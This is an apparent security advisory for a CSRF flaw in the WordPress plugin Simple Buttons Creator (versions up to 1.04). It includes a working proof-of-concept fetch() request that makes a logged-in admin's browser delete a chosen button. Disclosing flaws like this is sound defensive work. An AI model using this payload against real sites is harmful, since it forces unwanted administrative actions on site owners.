## WordPress Plugin Vulnerabilities

# Simple Buttons Creator <= 1.04 - Aribtrary Button Deletion via CSRF

### Description

The plugin does not have CSRF checks in some places, which could allow attackers to make logged in users perform unwanted actions via CSRF attacks

### Proof of Concept

Make a logged in admin open a page with the code below (where `<<VALID\_ID>>` is an existing button):
```
fetch("https://example.com/wp-admin/admin.php?page=simple-buttons", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'method=delete&id=<<VALID\_ID>>',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
```
